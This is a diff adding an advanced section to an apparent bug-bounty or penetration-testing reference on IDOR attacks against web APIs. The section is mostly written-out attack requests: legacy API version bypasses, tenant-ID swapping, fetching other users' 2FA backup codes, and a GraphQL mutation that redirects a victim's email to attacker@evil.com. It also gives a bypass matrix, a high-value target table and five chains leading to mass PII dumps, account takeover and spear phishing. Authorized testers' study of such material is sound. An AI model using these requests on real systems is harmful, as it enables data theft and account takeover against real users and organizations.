@@ -494,3 +494,295 @@ GET /reset?token=abc123&user_id=1002  ← attacker intercepts, changes 1002 to 1
 - Check JavaScript source for hardcoded endpoints and object ID patterns not visible in normal app flow
 - Test mobile app API traffic — mobile apps often expose undocumented API endpoints with weaker access control
 - IDOR in admin panel → always higher severity, often leads to full platform compromise
+
+---
+
+## Advanced Patterns
+
+### API Versioning Bypass
+
+A very common pattern: developers add authorization checks to the new API version but
+forget to deprecate or protect the old one.
+
+```http
+# v2 properly checks ownership:
+GET /api/v2/users/1002/documents → 403 Forbidden
+
+# v1 has no authorization check:
+GET /api/v1/users/1002/documents → 200 OK (all documents returned)
+
+# Also try:
+GET /api/v0/users/1002/documents
+GET /api/internal/users/1002/documents
+GET /api/legacy/users/1002/documents
+GET /api/mobile/users/1002/documents  # Mobile API endpoint often less hardened
+
+# Common discovery: check JS bundles for old API paths,
+# check Wayback Machine for deprecated endpoints
+```
+
+### State Machine / Workflow IDOR
+
+Some objects can only be accessed in certain states. Skipping workflow steps via IDOR
+allows accessing objects outside their intended state.
+
+```http
+# Normal flow: draft → submitted → approved → published
+# IDOR: jump from draft directly to published state
+
+# Step 1: Create draft (returns id=555)
+POST /api/documents {"title": "test", "status": "draft"}
+→ {"id": 555, "status": "draft"}
+
+# Step 2: Skip approval — directly access another user's approved document:
+GET /api/documents/approved/333   ← not your document, wrong state
+
+# Step 3: Directly update state of another user's document:
+PUT /api/documents/333/status {"status": "published"}
+```
+
+### Async Job / Export Queue IDOR
+
+Background job IDs are often sequential and accessible before authorization is checked.
+
+```http
+# Trigger an export for your account:
+POST /api/exports {"type": "user_data"}
+→ {"job_id": "job_4521", "status": "pending"}
+
+# Poll another user's job ID (sequential):
+GET /api/exports/job_4520/status   ← someone else's export
+GET /api/exports/job_4520/download ← download their data
+
+# Common targets: data export, PDF generation, report scheduling, CSV download
+```
+
+### Tenant Isolation Failure (SaaS Multi-Tenancy)
+
+```http
+# Single-tenant API — user ID is scoped to tenant via JWT
+# IDOR: modify org_id or tenant_id parameter to access another company's data
+
+GET /api/org/tenant-abc/users HTTP/1.1
+Authorization: Bearer <token for tenant-xyz>
+→ If server doesn't validate token's org matches path param → data breach
+
+# Also test:
+POST /api/reports {"org_id": "target-tenant", "type": "all_users"}
+GET /api/settings?company_id=competitor-org-id
+
+# Header-based tenant confusion:
+X-Tenant-ID: other-tenant
+X-Organization-ID: other-org
+```
+
+### IDOR in 2FA / Backup Codes
+
+```http
+# 2FA backup codes often stored with user_id reference
+GET /api/users/1002/2fa/backup-codes   ← another user's backup codes
+
+# Reset another user's 2FA:
+DELETE /api/users/1002/2fa
+POST /api/users/1002/2fa/reset
+
+# View another user's active sessions:
+GET /api/users/1002/sessions
+
+# Revoke another user's specific session:
+DELETE /api/sessions/sess_abc123   ← session ID from IDOR in session listing
+```
+
+### Object-Level vs Field-Level IDOR
+
+Object-level IDOR (full object access) is commonly tested. Field-level is often missed.
+
+```http
+# Object-level (commonly tested):
+GET /api/users/1002 → returns all fields
+
+# Field-level (often missed): object is your own, but field should be hidden
+GET /api/users/1001    ← your own account
+{
+  "id": 1001,
+  "email": "you@example.com",
+  "salary": 95000,         ← should not be visible to self
+  "internal_score": 82,   ← admin-only field returned to user
+  "password_hash": "..."  ← should never be returned
+}
+
+# Test: compare fields returned to regular user vs admin
+# Use Burp Comparer on two responses
+```
+
+### IDOR via HTTP Parameter Pollution
+
+```http
+# Some frameworks use first or last occurrence of a duplicate param
+# Inject second user_id alongside your own to confuse server
+
+GET /api/documents?user_id=1001&user_id=1002
+# → If server uses last value: returns user 1002's documents
+# → If server uses first value: returns user 1001's documents
+
+# Works in: PHP ($_GET last value wins), Node (Express uses array or last),
+#           Java (first value wins), ASP.NET (comma-joins values)
+
+POST /api/transfer
+user_id=1001&amount=100&user_id=1002
+```
+
+---
+
+## Threat Model
+
+> Current patterns as of 2026-Q2. Update each session.
+
+**What's being exploited in the wild:**
+
+1. **API versioning bypass** — The #1 underappreciated IDOR vector. v1/v0/internal/
+   legacy/mobile endpoints consistently lack authorization that v2/v3 endpoints have.
+   Accounts for a large percentage of high-severity HackerOne IDOR reports.
+
+2. **GraphQL IDOR at scale** — As more APIs migrate to GraphQL, IDOR in mutations is
+   extremely common. Developers implement query-level auth but forget mutation-level.
+   Batch queries allow mass enumeration in a single request.
+
+3. **Bulk operations skip per-object auth** — `DELETE /api/items` with a body of IDs
+   almost never validates each ID against the session. Affects archiving, exporting,
+   tagging, and batch-status-change features.
+
+4. **Tenant isolation in SaaS** — Multi-tenant SaaS platforms are a goldmine. org_id
+   or company_id parameters passed in request body or headers — if not validated against
+   JWT claims — allow cross-tenant data access. This is a critical vulnerability in B2B
+   platforms.
+
+5. **Mobile API lag** — Mobile apps often communicate with `/api/mobile/` or `/api/v1/`
+   endpoints that have fewer auth checks than the web app's API. Always intercept mobile
+   app traffic (use Frida or HTTP proxy on device) separately from web.
+
+---
+
+## Bypass Matrix
+
+| Protection Mechanism | Bypass Technique |
+|---------------------|-----------------|
+| Endpoint checks auth | Try older API version (v1, v0, /internal/, /legacy/) |
+| UUID (hard to guess) | Find UUID in email, JS, API response body, or info disclosure |
+| 403 on GET | Try PUT, PATCH, DELETE, POST on same path |
+| 403 on path param | Try same ID in query string, request body, or header |
+| Object scoped to org | Modify org_id / tenant_id / company_id param |
+| Rate limited enumeration | Use GraphQL aliases to batch in one request |
+| Authorization middleware | Try missing auth header entirely (some bypass auth entirely) |
+| Per-object check on v2 | Same endpoint on v1/v0/internal/mobile |
+| Sequential IDs monitored | Use existing leaked IDs from emails, JS, error messages |
+| Response is 404 not 403 | Still attempt write methods (PUT/DELETE) — 404 may be fake |
+
+---
+
+## High-Value Targets
+
+| Target | IDOR Type | Impact |
+|--------|-----------|--------|
+| `/api/admin/users` | Vertical | All user PII, role manipulation |
+| `/api/org/{id}/members` | Tenant isolation | Competitor's org data |
+| `/api/invoices/{id}/download` | Horizontal | Financial documents, PII |
+| `/api/users/{id}/sessions` | Horizontal | Active session list → session fixation |
+| `/api/exports/job_{id}` | Async queue | Data export of another user |
+| `/api/v1/users/{id}` (vs v2) | API version | Unprotected legacy endpoint |
+| GraphQL `deletePost(id:)` mutation | GraphQL | Delete another user's content |
+| `/api/2fa/backup-codes` | Horizontal | Bypass 2FA → full ATO |
+| `/api/webhooks/{id}` | Horizontal | Change webhook URL → SSRF |
+| `/api/payment-methods/{id}` | Horizontal | Financial data, charge trigger |
+| Batch delete `{"ids": [...]}` | Bulk | Cross-user deletion |
+| `/api/team/invite/{token}` | Horizontal | Accept invite meant for others |
+
+---
+
+## Real-World Chains
+
+### Chain 1: IDOR + API v1 Bypass → Full User Data Dump
+
+```
+1. Register as a standard user on a SaaS platform
+2. Observe: GET /api/v2/users/1002 → 403 (properly protected)
+3. Try: GET /api/v1/users/1002 → 200 (legacy endpoint, no auth check)
+4. Discover v1 returns: email, phone, address, payment_method_last4, account_balance
+5. Enumerate: GET /api/v1/users/1 through /1000 with Burp Intruder
+6. Extract full PII database for all users
+
+Impact: Critical — mass PII exposure
+Report note: always check Wayback Machine and JS files for old API paths
+```
+
+### Chain 2: GraphQL Mutation IDOR → Account Takeover
+
+```graphql
+# 1. Discover updateUserEmail mutation via introspection
+mutation {
+  __type(name: "Mutation") { fields { name } }
+}
+# → finds: updateUserEmail(userId: ID!, email: String!): User
+
+# 2. Normal use:
+mutation { updateUserEmail(userId: "1001", email: "me@example.com") { success } }
+# → 200 OK
+
+# 3. IDOR: update another user's email
+mutation { updateUserEmail(userId: "1002", email: "attacker@evil.com") { success } }
+# → 200 OK (no ownership check on userId)
+
+# 4. Trigger password reset for attacker@evil.com → attacker receives reset link
+# 5. Reset password → full account takeover
+
+Impact: Critical — ATO on any account
+```
+
+### Chain 3: IDOR in Async Export → Competitor Data Exfil
+
+```
+1. Request data export for your account:
+   POST /api/exports {"type": "all_data"} → {"job_id": "export_9182"}
+
+2. Notice job_id is sequential (or predictable)
+
+3. Poll adjacent job IDs:
+   GET /api/exports/export_9181/status → {"status": "complete", "owner": "acme-corp"}
+   GET /api/exports/export_9181/download → Downloads acme-corp's full data export
+
+4. No ownership check on the /download endpoint — any authenticated user can fetch any job
+
+Impact: Critical — mass data exfiltration, B2B SaaS scenario
+```
+
+### Chain 4: Tenant IDOR → Cross-Org Data Access → Lateral Movement
+
+```
+1. Sign up for SaaS platform — receive JWT containing:
+   {"sub": "user123", "org": "attacker-corp", "role": "admin"}
+
+2. Test: GET /api/org/victim-corp/reports
+   Authorization: Bearer <attacker-corp JWT>
+   → Returns victim-corp's reports (org param not validated against JWT)
+
+3. Read victim-corp's internal data → extract user list + contact info
+
+4. Use contact info for spear phishing against victim-corp employees
+   → Compromise victim-corp account → lateral movement within platform
+
+Impact: Critical — cross-tenant data breach in SaaS
+```
+
+### Chain 5: IDOR on 2FA Backup Codes → ATO on High-Value Account
+
+```
+1. Find: GET /api/users/{id}/2fa/backup-codes (requires auth, but no ownership check)
+2. Identify high-value target user ID (from public profile, API response, enumeration)
+3. Fetch their backup codes:
+   GET /api/users/42/2fa/backup-codes → ["XXXX-YYYY", "AAAA-BBBB", ...]
+4. Try to log in as victim (need their email — find via another IDOR or info disclosure)
+5. Use backup code when 2FA is requested → bypasses 2FA
+6. Full account takeover even with 2FA enabled
+
+Impact: Critical — complete bypass of 2FA protection
+```
